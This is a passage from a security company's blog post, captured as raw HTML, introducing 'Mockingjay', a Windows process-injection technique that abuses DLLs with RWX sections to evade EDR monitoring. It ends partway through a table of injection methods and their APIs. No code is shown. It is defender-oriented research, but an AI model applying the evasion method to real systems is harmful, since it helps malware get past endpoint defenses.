# https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution

<!DOCTYPE html><html lang="en" style="scroll-padding-top: 137px;">
<body class="" style="--scrollbar-width: 15px;">








    <!--pageHtmlEmbeds.bodyStart start-->
    
    
    
    <!--pageHtmlEmbeds.bodyStart end-->















    <!-- domStoreHtml -->
    <svg data-dom-store="" style="display:none"><defs id="dom-store-defs"></defs></svg>
    

<div id="SITE_CONTAINER"><div id="main_MF" class="main_MF"><div id="SCROLL_TO_TOP" class="Vd6aQZ ignore-focus SCROLL_TO_TOP" role="region" tabindex="-1" aria-label="top of page"><span class="mHZSwn">top of page</span></div><div id="BACKGROUND_GROUP" class="backgroundGroup_cid0j BACKGROUND_GROUP"><div id="BACKGROUND_GROUP_TRANSITION_GROUP"><div id="pageBackground_cid0j" data-media-height-override-type="" data-media-position-override="false" class="pageBackground_cid0j BmZ5pC"><div id="bgLayers_pageBackground_cid0j" data-hook="bgLayers" data-motion-part="BG_LAYER pageBackground_cid0j" class="MW5IWV"><div data-testid="colorUnderlay" class="LWbAav Kv1aVt"></div><div id="bgMedia_pageBackground_cid0j" data-motion-part="BG_MEDIA pageBackground_cid0j" class="VgO9Yg"></div></div></div></div></div><div id="site-root" class="site-root"><div id="masterPage" class="mesh-layout masterPage css-editing-scope"><main id="PAGES_CONTAINER" class="PAGES_CONTAINER" tabindex="-1" data-main-content="true"><div id="SITE_PAGES" class="JsJXaX SITE_PAGES"><div id="SITE_PAGES_TRANSITION_GROUP" class="AnQkDU"><div id="cid0j" class="dBAkHi theme-vars cid0j"><div class="PFkO7r wixui-page" data-testid="page-bg"></div><div class="HT5ybB"><!--$--><div id="Containercid0j" class="Containercid0j SPY_vo"><div data-mesh-id="Containercid0jinlineContent" data-testid="inline-content" class=""><div data-mesh-id="Containercid0jinlineContent-gridContainer" data-testid="mesh-container-content"><!--$--><section id="comp-l92nly65" tabindex="-1" class="Oqnisf comp-l92nly65 wixui-section" data-block-level-container="ClassicSection"><div id="bgLayers_comp-l92nly65" data-hook="bgLayers" data-motion-part="BG_LAYER comp-l92nly65" class="MW5IWV"><div data-testid="colorUnderlay" class="LWbAav Kv1aVt"></div><div id="bgMedia_comp-l92nly65" data-motion-part="BG_MEDIA comp-l92nly65" class="VgO9Yg"></div></div><div data-mesh-id="comp-l92nly65inlineContent" data-testid="inline-content" class=""><div data-mesh-id="comp-l92nly65inlineContent-gridContainer" data-testid="mesh-container-content"><!--$--><div id="TPAMultiSection_l92l3b51" class="TWFxr5  "><div class="TPAMultiSection_l92l3b51"><div style="--wix-color-29:var(--wix-color-3);--wix-color-37:var(--wix-color-5);--wix-color-38:var(--wix-color-8);--wix-color-39:var(--wix-color-8);--wix-color-40:var(--wix-color-1);--wix-color-41:var(--wix-color-8);--wix-color-42:var(--wix-color-8);--wix-color-43:var(--wix-color-1);--wix-color-44:var(--wix-color-3);--wix-color-45:var(--wix-color-3);--wix-color-46:var(--wix-color-1);--wix-color-47:var(--wix-color-1);--wix-color-48:var(--wix-color-8);--wix-color-49:var(--wix-color-8);--wix-color-50:var(--wix-color-1);--wix-color-51:var(--wix-color-8);--wix-color-52:var(--wix-color-8);--wix-color-53:var(--wix-color-1);--wix-color-54:var(--wix-color-3);--wix-color-55:var(--wix-color-3)" data-hook="tpa-components-provider"><div><div style="--root-width:980px" class="md lt-lg lt-xl gt-xs gt-s gt-sm gt-740 gt-830 gt-886 gt-940 w686-980 lte-w980 lte-banner-w1564 lte-banner-w1425 lte-banner-w1181 lte-banner-w980 lte-category-header-w1364  urT2WH" data-hook="post-page-root"><div class=""><div id="TPAMultiSection_l92l3b51.above-header" data-hook="slot-placeholder-TPAMultiSection_l92l3b51.above-header" class=""></div></div><div class="L5x0Fp xZVb1s is-desktop app-desktop"><div class="qi0cF2 message" data-hook="message"></div><div class="WmZAIu" id="new-blog-popover-root"></div><div id="content-wrapper"><div class="vAU8Qm aSX36E XDcQnF OdeuKJ kCb5Uz blog-header-background-color" style="--padding:20px;--content-size:940px" data-hook="blog-desktop-header-container"><div class="kiyM2X NEquMY"><div style="flex-grow:1"></div><div class="EKJcYR"><div class="gXfmMa" data-hook="search-input"><div class="kD1Yyw IAhK9I search-input" tabindex="-1"><div tabindex="0" role="button" aria-label="Search"><svg xmlns="http://www.w3.org/2000/svg" width="19" viewBox="0 0 19 19" aria-hidden="true" class="jMrgc4 blog-desktop-header-search-icon-fill"><path d="M12.8617648,11.8617648 L15.8633394,14.8633394 C15.9414442,14.9414442 15.9414442,15.0680772 15.8633394,15.1461821 L15.1461821,15.8633394 C15.0680772,15.9414442 14.9414442,15.9414442 14.8633394,15.8633394 L11.8617648,12.8617648 C10.9329713,13.578444 9.76865182,14.0047607 8.50476074,14.0047607 C5.46719462,14.0047607 3.00476074,11.5423269 3.00476074,8.50476074 C3.00476074,5.46719462 5.46719462,3.00476074 8.50476074,3.00476074 C11.5423269,3.00476074 14.0047607,5.46719462 14.0047607,8.50476074 C14.0047607,9.76865182 13.578444,10.9329713 12.8617648,11.8617648 Z M8.5,13 C10.9852814,13 13,10.9852814 13,8.5 C13,6.01471863 10.9852814,4 8.5,4 C6.01471863,4 4,6.01471863 4,8.5 C4,10.9852814 6.01471863,13 8.5,13 Z"></path></svg></div><input class="m2yAmK blog-desktop-header-search-text-color blog-desktop-header-search-font search-input__input" type="text" placeholder="Search" value=""><div class="RFnngL blog-desktop-header-search-text-color blog-desktop-header-search-font iLMCUc">Search</div><div class="BN409S blog-desktop-header-search-border-background-color"></div></div></div></div></div></div><div class="ZL4A4N" data-hook="post-page"><div class=""><div id="TPAMultiSection_l92l3b51.above-content-1" data-hook="slot-placeholder-TPAMultiSection_l92l3b51.above-content-1" class=""></div></div><div class=""><div id="TPAMultiSection_l92l3b51.above-content-2" data-hook="slot-placeholder-TPAMultiSection_l92l3b51.above-content-2" class=""></div></div><div class="HcBlwg"><div class="zp8IQu"><div><div class="EcwjNF"><article class="tgMH9T" data-hook="post"><section class="UYw9XC" data-hook="post-hero-image"></section><div class="HW6ttf"><section class="VQDdIN" data-hook="post-description"><div class="moHCnT"><div class="moHCnT"><div class="fTEXDR" data-rce-version="10.157.0"><div class="Y2QL9" dir="ltr" style="--ricos-text-color:rgb(var(--textParagraphColor-rgb));--ricos-text-color-tuple:var(--textParagraphColor-rgb);--ricos-action-color:rgb(var(--postButtonBackgroundColor));--ricos-action-color-tuple:var(--postButtonBackgroundColor);--ricos-background-color:rgb(var(--postBackgroundColor));--ricos-background-color-tuple:var(--postBackgroundColor);--ricos-fallback-color:rgb(0, 0, 0);--ricos-fallback-color-tuple:0, 0, 0;--ricos-settings-action-color:rgb(0, 0, 0);--ricos-settings-action-color-tuple:0, 0, 0;--ricos-text-on-action-color:rgb(var(--postButtonTextColor));--ricos-text-on-action-color-tuple:var(--postButtonTextColor);--ricos-action-color-fallback:rgb(0, 0, 0);--ricos-action-color-fallback-tuple:0, 0, 0;--ricos-custom-p-font-weight:var(--textParagraphFont-weight);--ricos-custom-p-font-style:var(--textParagraphFont-style);--ricos-custom-p-line-height:max(calc(var(--textParagraphFont-size) * 1.5), var(--textParagraphFont-line-height));--ricos-custom-p-font-size:var(--textParagraphFont-size);--ricos-custom-p-font-family:var(--textParagraphFont-family);--ricos-custom-p-text-decoration:var(--textParagraphFont-text-decoration);--ricos-custom-p-color:rgb(var(--textParagraphColor));--ricos-custom-h1-font-weight:var(--textH1Font-weight);--ricos-custom-h1-font-style:var(--textH1Font-style);--ricos-custom-h1-line-height:var(--textH1Font-line-height);--ricos-custom-h1-font-size:var(--textH1Font-size);--ricos-custom-h1-font-family:var(--textH1Font-family);--ricos-custom-h1-text-decoration:var(--textH1Font-text-decoration);--ricos-custom-h1-color:rgb(var(--textH1Color));--ricos-custom-h2-font-weight:var(--textH2Font-weight);--ricos-custom-h2-font-style:var(--textH2Font-style);--ricos-custom-h2-line-height:var(--textH2Font-line-height);--ricos-custom-h2-font-size:var(--textH2Font-size);--ricos-custom-h2-font-family:var(--textH2Font-family);--ricos-custom-h2-text-decoration:var(--textH2Font-text-decoration);--ricos-custom-h2-color:rgb(var(--textH2Color));--ricos-custom-h3-font-weight:var(--textH3Font-weight);--ricos-custom-h3-font-style:var(--textH3Font-style);--ricos-custom-h3-line-height:var(--textH3Font-line-height);--ricos-custom-h3-font-size:var(--textH3Font-size);--ricos-custom-h3-font-family:var(--textH3Font-family);--ricos-custom-h3-text-decoration:var(--textH3Font-text-decoration);--ricos-custom-h3-color:rgb(var(--textH3Color));--ricos-custom-h4-font-weight:var(--textH4Font-weight);--ricos-custom-h4-font-style:var(--textH4Font-style);--ricos-custom-h4-line-height:var(--textH4Font-line-height);--ricos-custom-h4-font-size:var(--textH4Font-size);--ricos-custom-h4-font-family:var(--textH4Font-family);--ricos-custom-h4-text-decoration:var(--textH4Font-text-decoration);--ricos-custom-h4-color:rgb(var(--textH4Color));--ricos-custom-h5-font-weight:var(--textH5Font-weight);--ricos-custom-h5-font-style:var(--textH5Font-style);--ricos-custom-h5-line-height:var(--textH5Font-line-height);--ricos-custom-h5-font-size:var(--textH5Font-size);--ricos-custom-h5-font-family:var(--textH5Font-family);--ricos-custom-h5-text-decoration:var(--textH5Font-text-decoration);--ricos-custom-h5-color:rgb(var(--textH5Color));--ricos-custom-h6-font-weight:var(--textH6Font-weight);--ricos-custom-h6-font-style:var(--textH6Font-style);--ricos-custom-h6-line-height:var(--textH6Font-line-height);--ricos-custom-h6-font-size:var(--textH6Font-size);--ricos-custom-h6-font-family:var(--textH6Font-family);--ricos-custom-h6-text-decoration:var(--textH6Font-text-decoration);--ricos-custom-h6-color:rgb(var(--textH6Color));--ricos-custom-quote-line-height:var(--textQuoteFont-line-height);--ricos-custom-quote-font-size:var(--textQuoteFont-size);--ricos-custom-quote-font-style:var(--textQuoteFont-style);--ricos-custom-quote-font-family:var(--textQuoteFont-family);--ricos-custom-quote-font-weight:var(--textQuoteFont-weight);--ricos-custom-quote-text-decoration:var(--textQuoteFont-text-decoration);--ricos-custom-quote-color:rgb(var(--textQuoteColor));--ricos-custom-quote-border-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-quote-margin-inline-start:var(--ricosQuoteMarginInlineStart);--ricos-custom-code-block-line-height:1.5;--ricos-custom-link-font-style:inherit;--ricos-custom-link-font-weight:inherit;--ricos-custom-link-text-decoration:inherit;--ricos-custom-link-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-hashtag-font-style:inherit;--ricos-custom-hashtag-font-weight:inherit;--ricos-custom-hashtag-text-decoration:inherit;--ricos-custom-hashtag-color:rgb(var(--textLinksAndHashtagsColor));--ricos-custom-footer-toolbar-padding-inline-start:var(--ricosFooterPadding);--ricos-custom-footer-toolbar-padding-inline-end:var(--ricosFooterPadding);--ricos-custom-editor-add-plugin-button-position-inline-start:var(--ricosAddPluginButtonStart);--ricos-breakout-normal-padding-start:var(--ricosNormalPadding);--ricos-breakout-normal-padding-end:var(--ricosNormalPadding);--ricos-breakout-full-width-padding-start:var(--ricosFullWidthPadding);--ricos-breakout-full-width-padding-end:var(--ricosFullWidthPadding)" data-id="content-viewer"><div class="_6OzSr"><div type="first" data-hook="rcv-block-first"></div><div class="cZVaD"><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-foo"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block1"></div><div data-breakout="normal"><div class="CKjkL" id="viewer-a0lq5"><div class="QwCqz wd7R1"><figure class="_0TCNT" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="LZwXu"><div style="--dim-height:1188;--dim-width:1190;--ricos-image-default-border-color:unset" id="a0lq5" class="s6q7U EjY43 N8UDE" data-hook="image-viewer-a0lq5"><wow-image id="e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png" class="undefined lhz4O" data-image-info="{&quot;containerId&quot;:&quot;a0lq5&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1190,&quot;height&quot;:1188,&quot;uri&quot;:&quot;e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG a0lq5" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true" data-transitioned=""><img src="https://static.wixstatic.com/media/e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png/v1/fill/w_740,h_739,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution" data-pin-media="https://static.wixstatic.com/media/e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png/v1/fill/w_1190,h_1188,al_c,q_90/e17082_1de6f4d4c7b44fecaa0facbcc42a8e72~mv2.png" draggable="false" data-ssr-src-done="true" fetchpriority="high" data-load-done=""></wow-image></div><button class="TmdpQ" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="FuKsb"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block2"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-al6gb"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block3"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-eflb6"><span class="akGp8"><span>Our research team is committed to continuously identifying potential security vulnerabilities and techniques that threat actors may exploit to bypass existing security controls. In this blog post, our team is detailing on a comprehensive research specifically focused on process injection techniques utilized by attackers to deceive robust security products integrated into the security stack, such as EDRs and XDRs.</span></span></p></div><div type="paragraph" data-hook="rcv-block4"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cdh87"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block5"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-b3ju2"><span class="akGp8"><span>Throughout the blog post, we will delve into various process injection techniques </span><a target="_blank" href="https://attack.mitre.org/techniques/T1055/" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>employed by attackers</span></u></a><span> to bypass security controls and gain unauthorized access. We will address the challenges presented by EDRs and XDRs, emphasizing the importance of understanding and mitigating the risks associated with process injection. Additionally, we will share insights gained from our research, including the development of our own process injection technique. We will highlight the capabilities and implications of this technique, shedding light on its effectiveness, potential impact and detection opportunities for defenders. </span></span></p></div><div type="paragraph" data-hook="rcv-block6"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-5lq29"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block7"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-1imps"><span class="akGp8"><span>By definition, process injection refers to the different methods employed to inject malicious code into the memory space of a process. This technique enables attackers to hide the injected code and evade detection. To accomplish this in a Windows environment, attackers rely on a combination of Windows APIs, each serving a specific purpose and following a specific order in the injection process.</span></span></p></div><div type="paragraph" data-hook="rcv-block8"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-dui75"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block9"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-36mqf"><span class="akGp8"><span>Security solutions are well aware of these techniques and have developed mechanisms to detect and block such operations based on the patterns executed in the operating system during an infection. To monitor such behaviors, EDR (Endpoint Detection and Response) software often sets hooks on these Windows APIs within the memory space of every launched process. These hooks intercept and capture the parameters passed to these functions, enabling the EDR to identify potentially malicious actions associated with these Windows APIs.</span></span></p></div><div type="paragraph" data-hook="rcv-block10"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-3vvd3"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block11"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-eastu"><span class="akGp8"><span>Considering that EDR systems commonly target several of the Windows APIs required to perform the process injections techniques publicly documented, our research aimed to </span><em style="font-style:italic"><span>discover alternative methods to dynamically execute code within the memory space of Windows processes, without relying on the monitored Windows APIs. </span></em></span></p></div><div type="paragraph" data-hook="rcv-block12"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-4nm0i"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block13"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-40i51"><span class="akGp8"><span>We explored trusted Windows libraries that already contain sections with default protections set as RWX (Read-Write-Execute). By misusing these libraries, we were able to successfully inject code into various processes and eliminate the need to execute several Windows APIs usually monitored by security solutions. This approach reduces the likelihood of detection by defense software, as our application does not directly invoke Windows APIs typically associated with process injection techniques.</span></span></p></div><div type="paragraph" data-hook="rcv-block14"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fqea"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block15"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-4k0cf"><span class="akGp8"><span>We call this technique "Mockingjay" as it is rather smoother than other techniques and requires smaller number of steps to achieve. The injection is executed without space allocation, setting permissions or even starting a thread. The uniqueness of this technique is that it requires a vulnerable DLL and copying code to the right section. As the copy echoes back in the read/write/execute, we considered the name Mockingjay suitable.</span></span></p></div><div type="paragraph" data-hook="rcv-block16"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-63r31"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block17"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-fmr4t"><span class="akGp8"><span>The article in nutshell:</span></span></p></div><div type="paragraph" data-hook="rcv-block18"></div><div data-breakout="normal"><pre class="v6Aoa sleG5 nsGWt" dir="auto" id="viewer-68oni"><span class=""><strong style="font-weight:700"><span style="color:#8b0000;text-decoration:inherit"><span>[1]</span></span></strong><span style="color:#c76b29;text-decoration:inherit"><span> </span></span><span>Our research team has recently developed and tested a new process injection technique called "Mockingjay"</span><span style="color:#8b0000;text-decoration:inherit"><span>.</span></span><span>
</span><strong style="font-weight:700"><span style="color:#8b0000;text-decoration:inherit"><span>[2]</span></span></strong><span style="color:#8b0000;text-decoration:inherit"><span> T</span></span><span>his technique has demonstrated its capability to successfully inject code into Windows processes even in the presence of security software like EDRs.
</span><strong style="font-weight:700"><span style="color:#8b0000;text-decoration:inherit"><span>[3]</span></span></strong><span style="color:#8b0000;text-decoration:inherit"><span> </span></span><span>Our unique approach, which involves leveraging a vulnerable DLL and copying code to the appropriate section, allowed us to inject code without memory allocation, permission setting, or even starting a thread in the targeted process.</span></span></pre></div><div type="code_block" data-hook="rcv-block19"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-aai1s"><span class="akGp8"><span>Security Joes is a multi-layered incident response company strategically located in nine different time-zones worldwide, providing a follow-the-sun methodology to respond to any incident remotely. Security Joes' clients are protected against this threat. </span></span></p></div><div type="paragraph" data-hook="rcv-block20"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-ea2v1"><span class="akGp8"><span>Contact us at </span><a target="_blank" href="mailto:response@securityjoes.com" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>response@securityjoes.com</span></u></a><span> for more information about our services and technologies and get additional recommendations to protect yourself against this kind of attack vector.</span></span></p></div><div type="paragraph" data-hook="rcv-block21"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-593lf"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block22"></div><div data-breakout="normal"><h2 class="AQ4-j AYDy0 nsGWt _6qLM3" dir="auto" id="viewer-6eeud"><span class="qKwSW"><span>Process Injection</span></span></h2></div><div type="heading" data-hook="rcv-block23"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cta8s"><span class="akGp8"><span>Process injection is a well-known technique utilized by malicious software and attackers to insert and execute code within the memory space of a process. This injection can occur either on the same process performing the operation (self-injection) or on an external process. In the case of injecting an external process, attackers typically target legitimate ones, such as running applications or system processes, aiming to achieve unauthorized access, manipulate the process's behavior, or conceal the injected code from security tools and defenders.</span></span></p></div><div type="paragraph" data-hook="rcv-block24"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-bbr4m"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block25"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-8hdfn"><span class="akGp8"><span>To inject and execute code in memory, whether within the same process or a remote process, attackers employ a combination of Windows APIs that serve distinct purposes within the injection logic. The number of function calls and the specific Windows APIs employed can vary depending on the technical foundation of the chosen code injection method. </span></span></p></div><div type="paragraph" data-hook="rcv-block26"></div><div data-breakout="normal"><div class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-djlle"><span class="akGp8"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block27"></div><div data-breakout="normal"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-79hvd"><span class="akGp8"><span>Over the years, multiple methods have been developed to achieve code injection and execution within the memory space of Windows processes. As reference, in the following table, the most common </span><a target="_blank" href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" rel="noopener" class="GKQb5 _9HA3o" data-hook="web-link"><u style="text-decoration:underline"><span>Process Injection methods</span></u></a><span> are described and compared based on the Windows API calls required to successfully implement them.</span></span></p></div><div type="paragraph" data-hook="rcv-block28"></div><div data-breakout="normal"><div class="Mvp-o"><div class="CKjkL" id="viewer-c129u"><div class="SVuqo QwCqz"><div class="augeL" style="position:relative;min-width:min-content;padding-top:24px;padding-bottom:24px;padding-inline-start:1px;padding-inline-end:1px;--ricos-internal-table-cell-padding-top:10px;--ricos-internal-table-cell-padding-right:10px;--ricos-internal-table-cell-padding-bottom:10px;--ricos-internal-table-cell-padding-left:10px;--ricos-internal-table-gap:0px"><table class="ydJbW" data-hook="table-component" style="border-spacing:0;border-collapse:separate"><colgroup><col style="width:120px;min-width:120px"><col style="width:120px;min-width:120px"><col style="width:120px;min-width:120px"></colgroup><tbody><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="dbz3s2552723" data-visual-col="0" data-visual-row="0" class="WGHeX" style="vertical-align:middle"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR _8YwHG _6qLM3" dir="auto" id="viewer-3ophnxz38"><span class="akGp8"><strong style="font-weight:700"><span>Name</span></strong></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="1wr5l2552725" data-visual-col="1" data-visual-row="0" class="WGHeX" style="vertical-align:middle"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR _8YwHG _6qLM3" dir="auto" id="viewer-554wgofkm"><span class="akGp8"><strong style="font-weight:700"><span>Description</span></strong></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="5fh8d2552727" data-visual-col="2" data-visual-row="0" class="WGHeX" style="vertical-align:middle"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR _8YwHG _6qLM3" dir="auto" id="viewer-rcrjutwto"><span class="akGp8"><strong style="font-weight:700"><span>Required Windows APIs</span></strong></span></p></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="uz5822552730" data-visual-col="0" data-visual-row="1" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-u1bsgv8ag"><span class="akGp8"><span>Self Injection</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="1sdw22552732" data-visual-col="1" data-visual-row="1" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-xin49cv1x"><span class="akGp8"><span>Technique commonly found in malware packers. This technique does not impact any external process; rather, the process executing the injection is the same process that receives the injected payload.</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="a8sqw2552734" data-visual-col="2" data-visual-row="1" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:-0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;right:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div><ul class="iSjXG nsGWt"><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-5qbiec6bq"><span class="akGp8"><span>VirtualAlloc, LocalAlloc, GlobalAlloc</span></span></p></li><li dir="auto" aria-level="1" class="nsLwz" style="text-align:AUTO;margin-inline-start:1.5em;list-style-type:disc"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="" id="viewer-6a2b1"><span class="akGp8"><span>VirtualProtect</span></span></p></li></ul><div data-hook="gap-spacer" class="oj1n6 QdJ50"></div></div></td></tr><tr style="height:47px"><td data-hook="table-plugin-cell" data-node-id="5q1p62552741" data-visual-col="0" data-visual-row="2" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div style="position:absolute;top:0.5px;bottom:0.5px;left:-0.5px;width:1px;background-color:var(--ricos-internal-table-border-color);z-index:100;pointer-events:none"></div><div class="-GXj5 dN6D7"><p class="DFnp0 WloJR nsGWt _6qLM3" dir="auto" id="viewer-cvox6u5mi"><span class="akGp8"><span>Classic DLL Injection</span></span></p></div></td><td data-hook="table-plugin-cell" data-node-id="q3azi2552743" data-visual-col="1" data-visual-row="2" class="WGHeX" style="vertical-align:top"><div style="position:absolute;top:-0.5px;left:-0.5px;right:0.5px;height:1px;background-color:var(--ricos-internal-table-border-color);z-index:101;pointer-events:none"></div><div 